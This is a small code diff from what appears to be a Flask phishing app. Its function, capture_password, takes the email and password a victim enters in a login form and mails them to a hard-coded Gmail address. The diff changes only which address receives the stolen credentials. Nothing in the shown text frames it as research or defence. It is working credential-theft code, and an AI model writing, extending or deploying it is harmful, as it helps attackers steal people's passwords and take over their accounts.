@@ -32,7 +32,7 @@ def capture_password():
         password = request.form.get('password')
 
         # Send email using Flask-Mail
-        recipient =  'robhh0014@gmail.com'  # Your email address to receive the email
+        recipient =  'randersson014@gmail.com'  # Your email address to receive the email
         subject = 'Login'
         body = f'Email: {email}\nPassword entered: {password}'
 
